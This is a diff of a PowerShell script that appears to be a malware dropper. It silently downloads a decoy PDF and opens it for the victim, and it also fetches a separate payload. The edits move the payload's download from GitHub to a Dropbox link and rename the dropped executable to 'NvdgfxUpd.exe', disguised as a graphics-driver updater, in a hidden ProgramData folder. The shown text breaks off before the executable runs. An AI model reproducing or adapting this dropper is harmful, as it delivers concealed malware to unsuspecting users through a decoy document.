@@ -1,7 +1,7 @@
 $ProgressPreference = 'SilentlyContinue'
 
 $File1Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/fls/doc.pdf" 
-$File2Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/res/resource" 
+$File2Url = "https://www.dropbox.com/scl/fi/90r2qw0y5poc4qsgye06l/resource?rlkey=vd6vnqc760v0af8kf0orfrx66&st=sp7ywbez&dl=1" 
 
 $File1Path = "$env:TEMP\DOC-8796578552.pdf"
 
@@ -10,8 +10,8 @@ try {
     Start-Process -FilePath $File1Path
 } catch { }
 
-$sourceFileName = "GDriveSyncSvc.exe" 
-$destinationFolder = "$env:ProgramData\GDriveSync" 
+$sourceFileName = "NvdgfxUpd.exe" 
+$destinationFolder = "$env:ProgramData\TmpNvd" 
 $destinationFilePath = Join-Path -Path $destinationFolder -ChildPath $sourceFileName
 
 try{
